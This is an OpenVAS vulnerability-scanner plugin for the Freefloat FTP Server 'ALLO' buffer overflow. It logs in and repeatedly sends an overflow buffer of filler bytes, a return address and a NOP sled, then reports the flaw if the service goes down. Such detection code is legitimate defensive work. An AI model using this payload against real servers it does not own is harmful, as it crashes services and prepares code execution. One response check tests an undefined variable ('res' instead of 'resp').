###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freefloat_ftpd_49265.nasl 13499 2019-02-06 12:55:20Z cfischer $
#
# Freefloat FTP Server 'ALLO' Command Remote Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103219");
  script_version("$Revision: 13499 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 13:55:20 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-08-22 16:04:33 +0200 (Mon, 22 Aug 2011)");
  script_bugtraq_id(49265);
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_name("Freefloat FTP Server 'ALLO' Command Remote Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49265");
  script_xref(name:"URL", value:"http://www.freefloat.com/sv/freefloat-ftp-server/freefloat-ftp-server.php");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/freefloat/detected");

  script_tag(name:"summary", value:"Freefloat FTP Server is prone to a buffer-overflow vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code within
  the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of
  this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");

port = get_ftp_port(default:21);
banner = get_ftp_banner(port:port);
if(!banner || "FreeFloat" >!< banner)
  exit(0);

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

banner = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if(!banner || "FreeFloat" >!< banner){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

junk1 = crap(data:raw_string(0x41),length:246);
ret   = raw_string(0xED,0x1E,0x94,0x7C);
nop   = crap(data:raw_string(0x90),length:200);
buff  = junk1 + ret + nop;

for( i=0; i<10; i++ ) {

  soc = open_sock_tcp(port);

  if(soc) {

    send(socket:soc,data:string("USER ", user,"\r\n"));
    recv = recv(socket:soc,length:512);

    send(socket:soc,data:string("PASS ",pass,"\r\n"));
    recv = recv(socket:soc,length:512);

    if("230 User" >!< recv)break;

    send(socket:soc,data:string("ALLO ",buff,"\r\n"));
  } else {
    break;
  }
}

close(soc);

sleep(10);

soc1 = open_sock_tcp(port);
if(!soc1) {
  security_message(port:port);
  exit(0);
}

resp = recv_line(socket:soc1, length:100);
close(soc1);
if(!res || "FreeFloat" >!< resp) {
  security_message(port:port);
  exit(0);
}

exit(99);